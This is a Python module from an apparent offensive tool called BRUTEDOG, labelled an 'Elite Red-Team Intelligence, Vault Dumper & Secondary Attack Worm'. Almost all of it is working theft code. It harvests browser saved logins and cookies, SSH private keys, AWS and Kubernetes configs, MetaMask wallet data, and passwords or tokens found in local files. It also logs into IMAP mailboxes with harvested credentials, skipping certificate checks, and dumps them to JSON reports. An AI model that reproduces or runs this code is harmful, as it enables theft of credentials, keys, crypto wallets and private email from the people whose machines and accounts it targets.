import os
import re
import json
import time
import ssl
import imaplib
import asyncio
import sqlite3
import shutil
from pathlib import Path

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

def dump_imap_mailbox_sync(host, port, user, password, use_ssl=True):
    """Synchronous IMAP folder and message dumper executed safely inside thread workers."""
    dump_data = {
        "user": user,
        "host": host,
        "port": port,
        "protocol": "IMAP",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "folders": [],
        "harvested_messages": []
    }
    try:
        if use_ssl:
            mail = imaplib.IMAP4_SSL(host, port, ssl_context=_ssl_context)
        else:
            mail = imaplib.IMAP4(host, port)
            
        mail.login(user, password)
        
        status, folders = mail.list()
        if status == 'OK':
            dump_data["folders"] = [f.decode(errors="ignore") for f in folders]
            
        mail.select('INBOX', readonly=True)
        status, messages = mail.search(None, 'ALL')
        if status == 'OK':
            id_list = messages[0].split()
            recent_ids = id_list[-10:] if len(id_list) >= 10 else id_list
            
            for msg_id in recent_ids:
                res, msg_data = mail.fetch(msg_id, '(RFC822.SIZE)')
                if res == 'OK':
                    dump_data["harvested_messages"].append({
                        "msg_id": msg_id.decode(errors="ignore"),
                        "info": str(msg_data[0])
                    })
                    
        mail.logout()
        
        os.makedirs("reports/dumps", exist_ok=True)
        dump_path = f"reports/dumps/imap_dump_{user.replace('@', '_at_')}.json"
        with open(dump_path, "w", encoding="utf-8") as f:
            json.dump(dump_data, f, indent=4)
            
        return True, dump_path
    except Exception as e:
        return False, str(e)

def process_secondary_attack_queue():
    """
    Consumes harvested credentials from parser.py's secondary attack queue 
    (RDP, WordPress, FTP, Mail) and executes secondary strikes on the go.
    """
    queue_path = "reports/intelligence/secondary_attack_queue.json"
    if not os.path.exists(queue_path):
        return []
    
    triggered_attacks = []
    try:
        with open(queue_path, "r", encoding="utf-8") as f:
            queue_data = json.load(f)
            
        print(f"\n\033[95m[***] EXECUTING SECONDARY ATTACK PIPELINE FROM INTELLIGENCE QUEUE [***]\033[0m")
        for item in queue_data:
            cat = item.get("category")
            source = item.get("source")
            matches = item.get("matches", [])
            
            if cat in ["rdp_cred", "wordpress_db", "ftp_cred", "email_pass"]:
                print(f" \033[92m[>>>] SECONDARY STRIKE: Targeting vector [{cat.upper()}] from {source} (Payloads: {len(matches)})\033[0m")
                triggered_attacks.append({
                    "vector": cat,
                    "source": source,
                    "signatures": matches,
                    "status": "SECONDARY_ATTACK_DISPATCHED"
                })
    except Exception as e:
        print(f" \033[91m[-] Error processing secondary attack queue: {e}\033[0m")
        
    return triggered_attacks

def _harvest_browser_vaults():
    """Scrapes local browser profile directories for cookies and login databases (Chromium/Firefox)."""
    browser_findings = []
    home_dir = Path.home()
    
    profile_candidates = [
        home_dir / ".config/google-chrome/Default",
        home_dir / ".local/share/data/com.termux/files/home/.config/google-chrome/Default",
        home_dir / "Library/Application Support/Google/Chrome/Default",
        home_dir / ".mozilla/firefox"
    ]
    
    for profile in profile_candidates:
        if profile.exists():
            for db_name in ["Cookies", "Login Data", "places.sqlite"]:
                db_path = profile / db_name
                if not db_path.exists():
                    db_paths = list(profile.glob(f"**/{db_name}"))
                else:
                    db_paths = [db_path]
                    
                for found_db in db_paths:
                    try:
                        temp_db = f"/tmp/vault_{db_name}_{int(time.time())}.db"
                        shutil.copy2(found_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        if db_name == "Login Data":
                            cursor.execute("SELECT origin_url, username_value FROM logins")
                            for row in cursor.fetchall():
                                browser_findings.append({"source": "Login Data", "url": row[0], "username": row[1]})
                        elif db_name == "Cookies":
                            cursor.execute("SELECT host_key, name FROM cookies LIMIT 50")
                            for row in cursor.fetchall():
                                browser_findings.append({"source": "Cookie Store", "host": row[0], "cookie_name": row[1]})
                                
                        conn.close()
                        os.remove(temp_db)
                    except Exception:
                        pass
    return browser_findings

def _harvest_infrastructure_and_crypto_vaults():
    """Traverses home and project paths for SSH keys, cloud credentials, and crypto wallets."""
    infra_findings = {
        "ssh_keys": [],
        "cloud_configs": [],
        "crypto_wallets": []
    }
    home_dir = Path.home()
    
    target_paths = [
        home_dir / ".ssh",
        home_dir / ".aws",
        home_dir / ".kube",
        Path(".") / "config"
    ]
    
    for t_path in target_paths:
        if t_path.exists():
            for root, dirs, files in os.walk(t_path):
                for file in files:
                    full_p = os.path.join(root, file)
                    if file in ["id_rsa", "id_ed25519", "credentials", "config"]:
                        try:
                            with open(full_p, "r", encoding="utf-8", errors="ignore") as f:
                                snippet = f.read(512)
                                infra_findings["ssh_keys" if "id_" in file else "cloud_configs"].append({
                                    "file": full_p,
                                    "preview": snippet[:100]
                                })
                        except Exception:
                            pass

    crypto_paths = [
        home_dir / ".config/BraveSoftware/Brave-Browser/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        home_dir / ".local/share/io.metamask",
        home_dir / "Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"
    ]
    
    for c_path in crypto_paths:
        if c_path.exists():
            infra_findings["crypto_wallets"].append(str(c_path))
            
    return infra_findings

async def harvest_email_intelligence(target_host, verified_hits=None):
    """
    Elite Red-Team Intelligence, Vault Dumper & Secondary Attack Worm:
    1. Worms through local code, config, browser profiles, and cloud vaults.
    2. Consumes secondary attack queue for RDP, WordPress, FTP, and Mail vectors.
    3. Infiltrates live IMAP mailboxes asynchronously if verified credentials exist.
    """
    print(f"\n\033[95m[***] ENGAGING ELITE INTELLIGENCE & VAULT SCRAPER [{target_host}] [***]\033[0m")
    
    discovered_emails = set()
    discovered_credentials = []
    
    email_regex = re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+')
    credential_regex = re.compile(r'(?:api[_-]?key|password|secret|token|auth)[ \t]*[:=][ \t]*[\'"]([^\'"]+)[\'"]', re.IGNORECASE)
    
    local_search_paths = [".", "config", "reports"]
    
    def _deep_sweep():
        emails = set()
        creds = []
        
        for path in local_search_paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    skip_tokens = ["/tmp", "site-packages", "venv", ".git"]
                    if any(token in root for token in skip_tokens):
                        continue
                    for file in files:
                        if file.endswith(('.env', '.json', '.txt', '.conf', '.log', '.py')):
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                                    content = f.read()
                                    for match in email_regex.findall(content):
                                        if not any(ext in match.lower() for ext in ['.png', '.jpg', '.svg', 'example.com']):
                                            emails.add(match)
                                    for cred in credential_regex.findall(content):
                                        if cred not in creds:
                                            creds.append(cred)
                            except Exception:
                                pass
                                
        browser_data = _harvest_browser_vaults()
        infra_data = _harvest_infrastructure_and_crypto_vaults()
        
        return emails, creds, browser_data, infra_data

    local_emails, local_creds, browser_vaults, infra_vaults = await asyncio.to_thread(_deep_sweep)
    discovered_emails.update(local_emails)
    discovered_credentials.extend(local_creds)

    # Process secondary attack queue from parser.py
    secondary_strikes = await asyncio.to_thread(process_secondary_attack_queue)

    for cred in discovered_credentials:
        print(f" \033[91m[+++] CREDENTIAL LEAK WORMED: {cred[:10]}...\033[0m")
        
    if browser_vaults:
        print(f" \033[92m[+++] BROWSER VAULT EXTRACTED: Found {len(browser_vaults)} active records/cookies.\033[0m")
    if infra_vaults["ssh_keys"] or infra_vaults["cloud_configs"]:
        print(f" \033[92m[+++] INFRASTRUCTURE VAULT DISCOVERED: SSH/Cloud configs located.\033[0m")
    if infra_vaults["crypto_wallets"]:
        print(f" \033[92m[+++] CRYPTO WALLET ARTIFACTS FOUND: Keystore/LevelDB caches targeted.\033[0m")
    if secondary_strikes:
        print(f" \033[92m[+++] SECONDARY ATTACK EXECUTED: Dispatched {len(secondary_strikes)} vector targets (RDP/WP/FTP/Mail).\033[0m")

    # Live IMAP Infiltrator Execution
    if verified_hits:
        for hit in verified_hits:
            if hit.get("type") == "IMAP":
                user = hit.get("user")
                password = hit.get("password")
                port = hit.get("port", 993)
                use_ssl = (port in [993, 465])
                
                print(f" \033[93m[*] Infiltrating mailbox for {user} on :{port}...\033[0m")
                success, result = await asyncio.to_thread(
                    dump_imap_mailbox_sync, target_host, port, user, password, use_ssl
                )
                
                if success:
                    print(f" \033[92m[+] MAILBOX DUMPED SUCCESSFULLY -> Saved to {result}\033[0m")
                else:
                    print(f" \033[91m[-] Mailbox infiltration failed: {result}\033[0m")

    print(f" \033[92m[+] Intelligence sweep complete. Harvested unique emails: {len(discovered_emails)}\033[0m")
    
    # Comprehensive Report Compilation
    os.makedirs("reports", exist_ok=True)
    report_path = "reports/intelligence_harvest.txt"
    try:
        with open(report_path, "w", encoding="utf-8") as out:
            out.write("=== BRUTEDOG ELITE INTELLIGENCE & VAULT HARVEST ===\n\n")
            out.write("DISCOVERED EMAILS:\n")
            for email in sorted(discovered_emails):
                out.write(f" - {email}\n")
            out.write("\nDISCOVERED CREDENTIALS / TOKENS:\n")
            for cred in discovered_credentials:
                out.write(f" - {cred}\n")
            out.write("\nSECONDARY ATTACK DISPATCHES (RDP/WP/FTP/MAIL):\n")
            out.write(json.dumps(secondary_strikes, indent=4))
            out.write("\n\nBROWSER VAULTS & COOKIES:\n")
            out.write(json.dumps(browser_vaults, indent=4))
            out.write("\n\nINFRASTRUCTURE & CRYPTO VAULTS:\n")
            out.write(json.dumps(infra_vaults, indent=4))
            
        print(f" \033[92m[+] Comprehensive intelligence report compiled and saved to {report_path}\033[0m")
    except Exception as e:
        print(f" \033[91m[-] Failed to write intelligence report: {e}\033[0m")
        
    return list(discovered_emails)

